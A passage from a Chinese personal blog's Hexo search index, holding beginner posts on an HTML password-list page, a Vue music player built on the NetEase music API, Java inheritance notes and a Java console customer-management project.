0, 0, 0.2); /* 加入阴影 */ z-index: 1000; /* 确保toast在顶层 */ &#125; .content &#123; display: flex; font-weight: bold; font-size: 16px; &#125; /* 显示toast的动画 */ .show-toast &#123; animation: slideIn 0.5s ease forwards; &#125; /* 隐藏toast的动画 */ .hide-toast &#123; animation: slideOut 0.5s ease forwards; &#125; /* 入场动画 */ @keyframes slideIn &#123; from &#123; transform: translateX(200px); opacity: 0; &#125; to &#123; transform: translateX(0); opacity: 1; &#125; &#125; /* 出场动画 */ @keyframes slideOut &#123; from &#123; transform: translateX(0); opacity: 1; &#125; to &#123; transform: translateX(200px); opacity: 0; &#125; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;Toast&quot;&gt;&lt;/div&gt; &lt;div class=&quot;layout&quot;&gt; &lt;div class=&quot;bigBox&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; function myCopy(id, info) &#123; navigator.clipboard.writeText(pwdInfo[id][info]); showToast(`复制成功：$&#123;pwdInfo[id].name&#125;的$&#123;info&#125;`, 1200); &#125; let toastNumber = -1; function showToast(content, duration = 1000) &#123; toastNumber++; let toast = document.getElementById(&quot;Toast&quot;); let toastItem = document.createElement(&quot;div&quot;); toastItem.setAttribute(&quot;class&quot;, &quot;toast&quot;); toastItem.style.top = `$&#123;toastNumber * 65&#125;px`; toastItem.innerHTML = /*html*/ ` &lt;div class=&quot;content&quot;&gt; &lt;svg style=&quot;width:23px;color: rgb(10, 194, 58);&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 1024 1024&quot;&gt;&lt;path fill=&quot;currentColor&quot; d=&quot;M512 64a448 448 0 1 1 0 896 448 448 0 0 1 0-896m-55.808 536.384-99.52-99.584a38.4 38.4 0 1 0-54.336 54.336l126.72 126.72a38.272 38.272 0 0 0 54.336 0l262.4-262.464a38.4 38.4 0 1 0-54.272-54.336z&quot;&gt;&lt;/path&gt;&lt;/svg&gt; &lt;span style=&quot;margin-left:5px&quot;&gt;$&#123;content&#125;&lt;/span&gt; &lt;/div&gt; `; toast.appendChild(toastItem); // 使用Promise来同步setTimeout function delay(ms) &#123; return new Promise((resolve) =&gt; setTimeout(resolve, ms)); &#125; // 显示toast // 播放开始动画 toastItem.classList.add(&quot;show-toast&quot;); // 等待 进入动画+duration 时间后播放关闭动画 // toastItem.style.top = `$&#123;toastNumber * 65&#125;px`; delay(duration + 500).then(() =&gt; &#123; toastItem.classList.add(&quot;hide-toast&quot;); toastNumber--; &#125;); // 等待 进入动画+duration+出场动画 时间后播放移除节点 delay(duration + 500 + 500).then(() =&gt; &#123; if (toastItem) &#123; toastItem.remove(); &#125; &#125;); &#125; bigBox = document.querySelector(&quot;.bigBox&quot;); pwdInfo.forEach((info) =&gt; &#123; const showInfo = (category, tag) =&gt; &#123; return info[category] ? /*html*/ `&lt;a class=&quot;btn&quot; onclick=&quot;myCopy($&#123;info.id&#125;, &#x27;$&#123;category&#125;&#x27; )&quot;&gt; $&#123;tag&#125;:$&#123;info[category]&#125; &lt;/a&gt;` : &quot;&quot;; &#125;; bigBox.innerHTML += /*html*/ ` &lt;div class=&quot;personBox&quot;&gt; &lt;h3&gt;$&#123;info.name&#125;&lt;/h3&gt; $&#123;showInfo(&quot;email&quot;, &quot;Email&quot;)&#125; $&#123;showInfo(&quot;phone&quot;, &quot;Phone&quot;)&#125; $&#123;showInfo(&quot;password&quot;, &quot;Password&quot;)&#125; &lt;/div&gt;`; &#125;); &lt;/script&gt;&lt;/html&gt; pwd.js1234567891011121314const pwdInfo = [ &#123; id: 0, name: &quot;aaa&quot;, phone: &quot;111&quot;, password: &quot;111&quot;, &#125;, &#123; id: 1, name: &quot;bbb&quot;, phone: &quot;222&quot;, password: &quot;222&quot;, &#125;,];","tags":["html","密码管理"],"categories":["html"]},{"title":"Hello World ！！！","path":"//hello.html","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment"},{"title":"Vue音乐播放器施工进度（2）","path":"//coding/vue/2.html","content":"2022_07_21 施工进度 点击 http://vue_music.bandao.ltd 再点击歌单再点击音乐可以播放歌曲，下面的播放暂停按钮可正常使用主要难点：本地要代理访问网易云的 api，线上则不需要自己代理（这里花了两个小时来更正修复 bug：刷新导致 4041234567891011121314// vue.config.jsdevServer: &#123; proxy: &#123; &#x27;/api&#x27;: &#123; target: &#x27;https://music.163.com&#x27;,//这里填入你要请求的接口的前缀 ws: true,//代理websocked changeOrigin: true,//虚拟的站点需要更管origin secure: true, //是否https接口 pathRewrite: &#123; &#x27;^/api&#x27;: &#x27;&#x27;//重写路径 &#125; &#125; &#125;&#125; 12345678// footerMusic.vue&lt;!-- 本地使用这个，这里用了代理 --&gt;&lt;!-- &lt;audio ref=&quot;myAudio&quot; :src=&quot;`/api/song/media/outer/url?id=$&#123;playlist[playlistIndex].id&#125;.mp3`&quot;&gt;&lt;/audio&gt; --&gt;&lt;!-- 线上使用这个 --&gt;&lt;audio ref=&quot;myAudio&quot; :src=&quot;`https://music.163.com/song/media/outer/url?id=$&#123;playlist[playlistIndex].id&#125;.mp3`&quot;&gt;&lt;/audio&gt; 技术点 vuex123456789101112// store/index.jsmutations: &#123; updateIsBtnShow(state, value) &#123; state.isBtnShow = value &#125;, updatePlaylist(state, value) &#123; state.playlist = value &#125;, updatePlaylistIndex(state, value) &#123; state.playlistIndex = value &#125;, &#125;, 12345678// footerMusic.vueimport &#123; mapMutations, mapState &#125; from &#x27;vuex&#x27;computed: &#123; ...mapState([&#x27;playlist&#x27;, &#x27;playlistIndex&#x27;, &#x27;isBtnShow&#x27;]), &#125;,methods: &#123; ..mapMutations([&#x27;updateIsBtnShow&#x27;])&#125;,","tags":["网易云","工程","vue","音乐播放器"],"categories":["Vue前端"]},{"title":"Vue音乐播放器施工进度（1）","path":"//coding/vue/1.html","content":"2022-07-20 03:29:47 星期三 Daily 部分音乐没开自动播放好困啊，明天还要练车，绝了此页面随时消失嗷，说不定那天我又把服务器重启了，ngnix 又开不了了，这个页面就 g 了图片放在我另外一个网站上了也是随时会 g 掉明天还要处理一堆拍的照片 2022_07_19 施工进度点击 http://vue_music.bandao.ltd 再点击歌单网址是 http://vue_music.bandao.ltd/itemMusic?id=5349291073 （好像直接点击进不去耶，显示 404 我也没搞懂） 今天做的事情：上面的歌单信息展示部分写了 200 多行，大部分都是样式，写得我自己都要看不懂了已知 bug ： 直接点击链接或者再次刷新会 404，但是本地运行没有这个情况 歌单描述部分的箭头需要更改样式 pc 端显示大概率异常 需要努力的地方： 还需要了解一下 flex 布局 加快学习的速度啊 （原神活动主要都肝完了要好好学习了） 下面是代码部分123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271&lt;template&gt; &lt;img :src=&quot;playlist.coverImgUrl&quot; alt=&quot;&quot; class=&quot;bgImg&quot;&gt; &lt;van-row justify=&quot;space-between&quot; align=&quot;center&quot; class=&quot;itemMusicTop&quot;&gt; &lt;van-col span=&quot;8&quot; class=&quot;itemLeft&quot;&gt; &lt;van-icon name=&quot;arrow-left&quot; @click=&quot;$router.go(-1)&quot; size=&quot;25&quot; /&gt; &lt;span&gt;歌单&lt;/span&gt; &lt;/van-col&gt; &lt;van-col span=&quot;8&quot; class=&quot;itemRight&quot;&gt; &lt;van-icon name=&quot;search&quot; class=&quot;search&quot; size=&quot;25&quot; /&gt; &lt;van-icon name=&quot;wap-nav&quot; class=&quot;wap-nav&quot; size=&quot;25&quot; /&gt; &lt;/van-col&gt; &lt;/van-row&gt; &lt;van-row justify=&quot;space-between&quot; align=&quot;center&quot; class=&quot;itemMusicCenter&quot;&gt; &lt;van-col span=&quot;10&quot; class=&quot;imgBox&quot;&gt; &lt;div class=&quot;imgBoxAndplayCount&quot;&gt; &lt;span class=&quot;playCount&quot;&gt; &lt;svg class=&quot;icon&quot; aria-hidden=&quot;true&quot;&gt; &lt;use xlink:href=&#x27;#icon-bofang1&#x27;&gt;&lt;/use&gt; &lt;/svg&gt; &#123;&#123; changeCount(playlist.playCount) &#125;&#125; &lt;/span&gt; &lt;img :src=&quot;playlist.coverImgUrl&quot; alt=&quot;&quot; class=&quot;coverImg&quot;&gt; &lt;/div&gt; &lt;/van-col&gt; &lt;van-col span=&quot;14&quot;&gt; &lt;van-row justify=&quot;center&quot; class=&quot;listInfo&quot;&gt; &lt;van-col span=&quot;30&quot; class=&quot;title&quot;&gt;&#123;&#123; playlist.name &#125;&#125;&lt;/van-col&gt; &lt;van-col span=&quot;30&quot; class=&quot;creator&quot;&gt; &lt;img :src=&quot;playlist.creator.avatarUrl&quot; alt=&quot;&quot;&gt; &lt;span&gt; &#123;&#123; playlist.creator.nickname &#125;&#125; &lt;van-icon name=&quot;arrow&quot; size=&quot;15&quot; /&gt; &lt;/span&gt; &lt;/van-col&gt; &lt;van-col span=&quot;30&quot; class=&quot;description&quot;&gt; &lt;div class=&quot;text&quot;&gt; &#123;&#123; playlist.description &#125;&#125; &lt;/div&gt; &lt;van-icon name=&quot;arrow&quot; size=&quot;15&quot; /&gt; &lt;/van-col&gt; &lt;/van-row&gt; &lt;/van-col&gt; &lt;/van-row&gt; &lt;van-row justify=&quot;space-between&quot; align=&quot;center&quot; class=&quot;functionButtons&quot;&gt; &lt;van-col span=&quot;6&quot;&gt; &lt;van-icon name=&quot;chat-o&quot; size=&quot;30&quot; /&gt; &lt;span&gt;&#123;&#123; playlist.commentCount &#125;&#125;&lt;/span&gt; &lt;/van-col&gt; &lt;van-col span=&quot;6&quot;&gt; &lt;van-icon name=&quot;share-o&quot; size=&quot;30&quot; /&gt; &lt;span&gt;&#123;&#123; playlist.shareCount &#125;&#125;&lt;/span&gt; &lt;/van-col&gt; &lt;van-col span=&quot;6&quot;&gt; &lt;van-icon name=&quot;down&quot; size=&quot;30&quot; /&gt; &lt;span&gt;下载&lt;/span&gt; &lt;/van-col&gt; &lt;van-col span=&quot;6&quot;&gt; &lt;van-icon name=&quot;add-o&quot; size=&quot;30&quot; /&gt; &lt;span&gt;多选&lt;/span&gt; &lt;/van-col&gt; &lt;/van-row&gt;&lt;/template&gt;&lt;script&gt;import &#123; getMusicItemList &#125; from &#x27;@/request/api/item&#x27;export default &#123; name: &quot;itemMusicTop&quot;, props: [&#x27;playlist&#x27;], setup(props) &#123; // console.log(props); // 通过props进行传值，判断如果没有，则从sessionStorage获取 if ((props.playlist.creator = &quot;&quot;)) &#123; try &#123; console.log(&quot;here&quot;); props.playlist.creator = JSON.parse(sessionStorage.getItem(&#x27;itemDetail&#x27;)).playlist.creator &#125; catch &#123; console.log(&quot;here&quot;); let response = getMusicItemList(playlistId) playlist = response.data.playlist &#125; &#125; function changeCount(num) &#123; if (num &gt;= 100000000) &#123; // toFixed(1) 小数点后一位 return (num / 100000000).toFixed(1) + &quot;亿&quot; &#125; else if (num &gt;= 10000) &#123; return (num / 10000).toFixed(1) + &quot;万&quot; &#125; &#125; return &#123; changeCount &#125; &#125;&#125;&lt;/script&gt;&lt;style lang=&quot;less&quot; scoped&gt;.itemMusicTop &#123; height: 50px; padding: 10px; .itemLeft, .itemRight &#123; .van-icon &#123; color: #fff; &#125; &#125; .itemLeft &#123; span &#123; position: relative; font-size: 25px; margin-left: 30px; top: -2.5px; color: #fff; text-align: center; &#125; &#125; .itemRight &#123; position: absolute; right: 10px; .search &#123; margin-right: 40px; &#125; &#125;&#125;.bgImg &#123; position: fixed; width: 100%; height: 350px; z-index: -1; filter: blur(40px);&#125;.itemMusicCenter &#123; margin-top: -15px; padding: 10px; height: 180px; .imgBox &#123; padding: 5px; width: 150px; text-align: center; .imgBoxAndplayCount &#123; position: relative; height: 130px; width: 130px; .coverImg &#123; border-radius: 0.4rem; height: 130px; width: 130px; &#125; .playCount &#123; position: absolute; right: 0.1rem; top: 0.1rem; font-size: 0.25rem; color: #ccc; display: flex; align-items: center; background-color: rgba(0, 0, 0, 0.2); margin: 4px; padding: 3px; border-radius: 0.4rem; .icon &#123; width: 15px; fill: #ccc; &#125; &#125; &#125; &#125; .listInfo &#123; padding: 5px; flex-flow: column; width: 100%; height: 150px; .title &#123; font-weight: 900; color: #fff; font-size: .39rem; text-overflow: ellipsis; white-space: nowrap; overflow: hidden; &#125; .creator &#123; padding: 10px 5px; color: #ccc; img &#123; position: relative; border-radius: 0.6rem; height: 30px; &#125; span &#123; position: absolute; padding-left: 10px; width: 160px; font-size: .32rem; line-height: 30px; text-overflow: ellipsis; white-space: nowrap; overflow: hidden; &#125; .van-icon &#123; position: absolute; bottom: 7.5px; padding-left: 15px; &#125; &#125; .description &#123; position: relative; color: #ccc; // width: 80%; height: 80px; .text &#123; position: absolute; display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 4; overflow: hidden; width: 85%; &#125; .van-icon &#123; position: absolute; right: 13px; top: 27px; &#125; &#125; &#125;&#125;.functionButtons &#123; color: #fff; height: 1.5rem; padding: 5px; margin-bottom: 10px; .van-col &#123; display: flex; flex-direction: column; align-items: center; &#125;&#125;&lt;/style&gt;","tags":["网易云","工程","vue","音乐播放器"],"categories":["Vue前端"]},{"title":"java学习笔记12","path":"//coding/java/note/12.html","content":"面向对象的特征之二：继承性 why?一、继承性的好处： 减少了代码的冗余，提高了代码的复用性 便于功能的扩展 为之后多态性的使用，提供了前提 二、继承性的格式： class A extends B{} A:子类、派生类、subclass B:父类、超类、基类、superclass 2.1 体现：一旦子类 A 继承父类 B 以后，子类 A 中就获取了父类 B 中声明的所有的属性和方法。 特别的，父类中声明为 private 的属性或方法，子类继承父类以后，仍然认为获取了父类中私有的结构。 只有因为封装性的影响，使得子类不能直接调用父类的结构而已。 2.2 子类继承父类以后，还可以声明自己特有的属性或方法：实现功能的拓展。 子类和父类的关系，不同于子集和集合的关系。 extends：延展、扩展 三、Java 中关于继承性的规定： 一个类可以被多个子类继承。 Java 中类的单继承性：一个类只能有一个父类 子父类是相对的概念。 子类直接继承的父类，称为：直接父类。间接继承的父类称为：间接父类 子类继承父类以后，就获取了直接父类以及所有间接父类中声明的属性和方法 四、 Object 类 如果我们没有显式的声明一个类的父类的话，则此类继承于 java.lang.Object 类 所有的 java 类（除 java.lang.Object 类之外）都直接或间接的继承于 java.lang.Object 类 意味着，所有的 java 类具有 java.lang.Object 类声明的功能。 Creature.java12345678910111213package com.atguigu.java;/** * @program: project13 * @description: Creature类 * @author: kkx * @create: 2022-03-10 16:31 **/public class Creature &#123; public void breath()&#123; System.out.println(&quot;呼吸&quot;); &#125;&#125; Person.java12345678910111213141516171819202122232425262728293031323334package com.atguigu.java;/** * @program: project13 * @description: Person类 * @author: kkx * @create: 2022-03-10 15:50 **/public class Person extends Creature&#123; String name; private int age; public Person()&#123; &#125; public Person(String name, int age)&#123; this.name = name; this.age = age; &#125; public void eat()&#123; System.out.println(&quot;吃饭&quot;); &#125; public void sleep()&#123; System.out.println(&quot;睡觉&quot;); &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125; Student.java12345678910111213141516171819202122232425262728293031323334package com.atguigu.java;/** * @program: project13 * @description: Student类，继承 * @author: kkx * @create: 2022-01-05 10:22 **/public class Student extends Person&#123;// String name;// int age; String major; public Student()&#123; &#125; public Student(String name, int age, String major) &#123; this.name = name;// this.age = age; setAge(age); this.major = major; &#125;// public void sleep()&#123;// System.out.println(&quot;睡觉&quot;);// &#125; public void study()&#123; System.out.println(&quot;studying&quot;); &#125; public void show()&#123; System.out.println(&quot;name:&quot; + name + &quot;, age:&quot; + getAge()); &#125;&#125; ExtendsTest.java123456789101112131415161718192021222324252627282930package com.atguigu.java;/** * @program: project13 * @description: 继承测试 * @author: kkx * @create: 2022-01-05 10:24 **/public class ExtendsTest &#123; public static void main(String[] args) &#123; Person p1 = new Person();// p1.age = 1; p1.eat(); System.out.println(); Student s1 = new Student(); s1.eat(); s1.sleep(); s1.name = &quot;Tom&quot;; s1.setAge(10); s1.show(); s1.breath(); Creature c = new Creature(); System.out.println(c.toString()); &#125;&#125;","tags":["Java","学习笔记","基础","类","继承性"],"categories":["Java学习笔记"]},{"title":"java project 客户管理信息软件","path":"//coding/java/project/2.html","content":"客户管理信息软件参考视频（p248-p259）{bilibili bvid&#x3D;”1Kb411W75N” page&#x3D;”248”&#x2F;} CustomerView 主模块，菜单显示123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215package com.atguigu.p2.ui;import com.atguigu.p2.bean.Customer;import com.atguigu.p2.service.CustomerList;import com.atguigu.p2.util.CMUtility;/** * @program: project12 * @description: 主模块，菜单显示，处理用户操作 * @author: kkx * @create: 2021-12-28 17:12 **/public class CustomerView &#123; private CustomerList customerList = new CustomerList(10); public CustomerView()&#123; //默认有一个 Customer customer = new Customer(&quot;王涛&quot;, &#x27;男&#x27;, 23, &quot;13212341234&quot;, &quot;wt@gmail.com&quot;); customerList.addCustomer(customer); &#125; /** * @Description: 《显示客户信息管理软件》界面的方法 * @Author: kkx * @Date: 2022/1/4 * @Param: [] * @return: void */ public void enterMainMenu()&#123; boolean isFlag = true; while (isFlag)&#123; System.out.println(&quot; -----------------客户信息管理软件----------------- &quot;); System.out.println(&quot; 1 添 加 客 户&quot;); System.out.println(&quot; 2 修 改 客 户&quot;); System.out.println(&quot; 3 删 除 客 户&quot;); System.out.println(&quot; 4 客 户 列 表&quot;); System.out.println(&quot; 5 退 出 &quot;); System.out.print(&quot; 请选择(1-5)：&quot;); char menu = CMUtility.readMenuSelection(); switch (menu)&#123; case &#x27;1&#x27;: addNewCustomer(); break; case &#x27;2&#x27;: modifyCustomer(); break; case &#x27;3&#x27;: deleteCustomer(); break; case &#x27;4&#x27;: listAllCustomers(); break; case &#x27;5&#x27;: System.out.print (&quot;确认是否退出(Y/N)：&quot;); char isExit = CMUtility.readConfirmSelection(); if (isExit == &#x27;Y&#x27;) &#123; isFlag = false; &#125; break; &#125; &#125; &#125; /** * @Description: 添加客户的操作 * @Author: kkx * @Date: 2022/1/4 * @Param: [] * @return: void */ private void addNewCustomer()&#123; System.out.println(&quot;---------------------添加客户---------------------&quot;); System.out.print(&quot;姓名：&quot;); String name = CMUtility.readString(10); System.out.print(&quot;性别：&quot;); char gender = CMUtility.readChar(); System.out.print(&quot;年龄：&quot;); int age = CMUtility.readInt(); System.out.print(&quot;电话：&quot;); String phone = CMUtility.readString(13); System.out.print(&quot;邮箱：&quot;); String email = CMUtility.readString(30); //包装 Customer customer = new Customer(name, gender, age, phone, email); boolean isSuccess = customerList.addCustomer(customer); if (isSuccess)&#123; System.out.println(&quot;---------------------添加完成---------------------&quot;); &#125;else &#123; System.out.println(&quot;-------------------客户目录已满，添加失败---------------&quot;); &#125; &#125; /** * @Description: 修改客户的操作 * @Author: kkx * @Date: 2022/1/5 * @Param: [] * @return: void */ private void modifyCustomer()&#123; System.out.println(&quot;---------------------修改客户---------------------&quot;); //这两个放外面是因为后面在循环外要调用 int number; Customer cust; for (;;)&#123; System.out.print(&quot;请选择待修改客户编号(-1退出)：&quot;); number = CMUtility.readInt(); if (number == -1)&#123; return; &#125; cust = customerList.getCustomer(number - 1); if (cust == null)&#123; System.out.println(&quot;无法找到指定客户！&quot;); &#125;else &#123; break; &#125; &#125; //修改客户信息 System.out.print(&quot;姓名(&quot; + cust.getName() + &quot;):&quot;); String name = CMUtility.readString(10, cust.getName()); System.out.print(&quot;性别(&quot; + cust.getGender() + &quot;):&quot;); char gender = CMUtility.readChar(cust.getGender()); System.out.print(&quot;年龄(&quot; + cust.getAge() + &quot;):&quot;); int age = CMUtility.readInt(cust.getAge()); System.out.print(&quot;电话(&quot; + cust.getPhone() + &quot;):&quot;); String phone = CMUtility.readString(13, cust.getPhone()); System.out.print(&quot;邮箱(&quot; + cust.getEmail() + &quot;):&quot;); String email = CMUtility.readString(30, cust.getEmail()); Customer newCust = new Customer(name, gender, age, phone, email); boolean isReplaced = customerList.replaceCustomer(number - 1, newCust); if (isReplaced)&#123; System.out.println(&quot;---------------------修改完成---------------------&quot;); &#125;else &#123; //没有机会执行 System.out.println(&quot;---------------------修改失败---------------------&quot;); &#125; &#125; /** * @Description: 删除客户的操作 * @Author: kkx * @Date: 2022/1/5 * @Param: [] * @return: void */ private void deleteCustomer()&#123; System.out.println(&quot;---------------------删除客户---------------------&quot;); int number; for (;;)&#123; System.out.print(&quot;请选择待删除客户编号(-1退出)：&quot;); number = CMUtility.readInt(); if (number == -1)&#123; return; &#125; Customer customer = customerList.getCustomer(number -1); if (customer == null)&#123; System.out.println(&quot;无法找到指定客户！&quot;); &#125;else &#123; break; &#125; &#125; //找到了指定的客户，开始修改 System.out.print(&quot;确认是否删除(Y/N)：&quot;); char isDelete = CMUtility.readConfirmSelection(); if (isDelete == &#x27;Y&#x27;)&#123; boolean deleteSuccess = customerList.deleteCustomer(number - 1); if (deleteSuccess)&#123; System.out.println(&quot;---------------------删除完成---------------------&quot;); &#125;else &#123; //没有机会执行 System.out.println(&quot;---------------------删除失败---------------------&quot;); &#125; &#125;else &#123; return; &#125; &#125; /** * @Description: 显示客户列表的操作 * @Author: kkx * @Date: 2022/1/4 * @Param: [] * @return: void */ private void listAllCustomers()&#123; System.out.println(&quot;---------------------------客户列表--------------------------- &quot;); int total = customerList.getTotal(); if (total == 0)&#123; System.out.println(&quot;没有客户记录！&quot;); &#125;else &#123; System.out.println(&quot;编号\\t姓名\\t性别\\t年龄\\t电话\\t\\t邮箱&quot;); Customer[] custs = customerList.getAllCustomers(); for (int i = 0; i &lt; custs.length; i++) &#123; Customer cust = custs[i]; System.out.println((i + 1) + &quot;\\t&quot; + &quot;\\t&quot; + cust.getName() + &quot;\\t&quot; + cust.getGender() + &quot;\\t&quot; + &quot;\\t&quot; + cust.getAge() + &quot;\\t&quot; + &quot;\\t&quot; + cust.getPhone() + &quot;\\t&quot; + cust.getEmail()); &#125; &#125; System.out.println(&quot;-------------------------客户列表完成-------------------------&quot;); &#125; public static void main(String[] args)&#123; CustomerView view = new CustomerView(); view.enterMainMenu(); &#125;&#125; Customer 管理123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116package com.atguigu.p2.service;import com.atguigu.p2.bean.Customer;/** * @program: project12 * @description: Customer管理 * @author: kkx * @create: 2021-12-28 17:11 **/public class CustomerList &#123; private Customer[] customers; private int total; //记录存储的客户的个数 /** * @Description: 构造器，用来初始化customers数组 * @Author: kkx * @Date: 2021/12/28 * @Param: [totalCustomer] 指定customers数组的最大空间 * @return: */ public CustomerList(int totalCustomer)&#123; customers = new Customer[totalCustomer]; &#125; /** * @Description: 添加指定的客户到数组中 * @Author: kkx * @Date: 2021/12/28 * @Param: [customer] * @return: boolean 是否添加成功 */ public boolean addCustomer(Customer customer)&#123; //小于最大则可以添加 if (total &lt; customers.length)&#123; customers[total] = customer; total++; return true; &#125; return false; &#125; /** * @Description: 修改指定索引位置上的客户信息 * @Author: kkx * @Date: 2021/12/28 * @Param: [index, cust] * @return: boolean 是否修改成功 */ public boolean replaceCustomer(int index, Customer cust)&#123; if (index &lt; 0 || index &gt;= total)&#123; return false; &#125; customers[index] = cust; return true; &#125; /** * @Description: 删除指定索引位置上的客户信息 * @Author: kkx * @Date: 2022/1/4 * @Param: [index] * @return: boolean 是否删除成功 */ public boolean deleteCustomer(int index)&#123; if (index &lt; 0 || index &gt;= total)&#123; return false; &#125; for (int i = index; i &lt; total - 1; i++) &#123; customers[i] = customers[i + 1]; &#125; //这里先把最后那个指向null，total再-- customers[--total] = null; return true; &#125; /** * @Description: 获取所有客户的客户信息 * @Author: kkx * @Date: 2022/1/4 * @Param: [] * @return: com.atguigu.p2.bean.Customer[] */ public Customer[] getAllCustomers()&#123; Customer[] custs = new Customer[total]; for (int i = 0; i &lt; total; i++) &#123; custs[i] = customers[i]; &#125; return custs; &#125; /** * @Description: 返回指定索引位置上的Customer * @Author: kkx * @Date: 2022/1/4 * @Param: [index] * @return: 如果找到元素，则返回，如果没有找到，返回null */ public Customer getCustomer(int index)&#123; if (index &lt; 0 || index &gt;= total)&#123; return null; &#125; return customers[index]; &#125; /** * @Description: 获取存储的客户的数量 * @Author: kkx * @Date: 2022/1/4 * @Param: [] * @return: int */ public int getTotal()&#123; return total; &#125;&#125; Customer 类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566package com.atguigu.p2.bean;/** * @program: project12 * @description: Customer类 * @author: kkx * @create: 2021-12-28 17:08 **/public class Customer &#123; private String name; // 姓名 private char gender; // 性别 private int age; // 年龄 private String phone; // 电话 private String email; // 邮箱 public Customer() &#123; &#125; public Customer(String name, char gender, int age, String phone, String email) &#123; this.name = name; this.gender = gender; this.age = age; this.phone = phone; this.email = email; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public char getGender() &#123; return gender; &#125; public void setGender(char gender) &#123; this.gender = gender; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getPhone() &#123; return phone; &#125; public void setPhone(String phone) &#123; this.phone = phone; &#125; public String getEmail() &#123; return email; &#125; public void setEmail(String email) &#123; this.email = email; &#125;&#125; CMUtility 工具类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134package com.atguigu.p2.util;/** * @program: project12 * @description: CMUtility工具类 * @author: kkx * @create: 2021-12-28 17:14 **/import java.util.*;/** CMUtility工具类： 将不同的功能封装为方法，就是可以直接通过调用方法使用它的功能，而无需考虑具体的功能实现细节。 */public class CMUtility &#123; private static Scanner scanner = new Scanner(System.in); /** 用于界面菜单的选择。该方法读取键盘，如果用户键入’1’-’5’中的任意字符，则方法返回。返回值为用户键入字符。 */ public static char readMenuSelection() &#123; char c; for (; ; ) &#123; String str = readKeyBoard(1, false); c = str.charAt(0); if (c != &#x27;1&#x27; &amp;&amp; c != &#x27;2&#x27; &amp;&amp; c != &#x27;3&#x27; &amp;&amp; c != &#x27;4&#x27; &amp;&amp; c != &#x27;5&#x27;) &#123; System.out.print(&quot;选择错误，请重新输入：&quot;); &#125; else break; &#125; return c; &#125; /** 从键盘读取一个字符，并将其作为方法的返回值。 */ public static char readChar() &#123; String str = readKeyBoard(1, false); return str.charAt(0); &#125; /** 从键盘读取一个字符，并将其作为方法的返回值。 如果用户不输入字符而直接回车，方法将以defaultValue 作为返回值。 */ public static char readChar(char defaultValue) &#123; String str = readKeyBoard(1, true); return (str.length() == 0) ? defaultValue : str.charAt(0); &#125; /** 从键盘读取一个长度不超过2位的整数，并将其作为方法的返回值。 */ public static int readInt() &#123; int n; for (; ; ) &#123; String str = readKeyBoard(2, false); try &#123; n = Integer.parseInt(str); break; &#125; catch (NumberFormatException e) &#123; System.out.print(&quot;数字输入错误，请重新输入：&quot;); &#125; &#125; return n; &#125; /** 从键盘读取一个长度不超过2位的整数，并将其作为方法的返回值。 如果用户不输入字符而直接回车，方法将以defaultValue 作为返回值。 */ public static int readInt(int defaultValue) &#123; int n; for (; ; ) &#123; String str = readKeyBoard(2, true); if (str.equals(&quot;&quot;)) &#123; return defaultValue; &#125; try &#123; n = Integer.parseInt(str); break; &#125; catch (NumberFormatException e) &#123; System.out.print(&quot;数字输入错误，请重新输入：&quot;); &#125; &#125; return n; &#125; /** 从键盘读取一个长度不超过limit的字符串，并将其作为方法的返回值。 */ public static String readString(int limit) &#123; return readKeyBoard(limit, false); &#125; /** 从键盘读取一个长度不超过limit的字符串，并将其作为方法的返回值。 如果用户不输入字符而直接回车，方法将以defaultValue 作为返回值。 */ public static String readString(int limit, String defaultValue) &#123; String str = readKeyBoard(limit, true); return str.equals(&quot;&quot;)? defaultValue : str; &#125; /** 用于确认选择的输入。该方法从键盘读取‘Y’或’N’，并将其作为方法的返回值。 */ public static char readConfirmSelection() &#123; char c; for (; ; ) &#123; String str = readKeyBoard(1, false).toUpperCase(); c = str.charAt(0); if (c == &#x27;Y&#x27; || c == &#x27;N&#x27;) &#123; break; &#125; else &#123; System.out.print(&quot;选择错误，请重新输入：&quot;); &#125; &#125; return c; &#125; private static String readKeyBoard(int limit, boolean blankReturn) &#123; String line = &quot;&quot;; while (scanner.hasNextLine()) &#123; line = scanner.nextLine(); if (line.length() == 0) &#123; if (blankReturn) return line; else continue; &#125; if (line.length() &lt; 1 || line.length() &gt; limit) &#123; System.out.print(&quot;输入长度（不大于&quot; + limit + &quot;）错误，请重新输入：&quot;); continue; &#125; break; &#125; return line; &#125;&#125;","tags":["Java","基础","类","项目","java bean"],"categories":["Java项目"]},{"title":"java学习笔记11","path":"//coding/java/note/11.html","content":"封装性面向对象的特征一：封装与隐藏一.问题的引入： 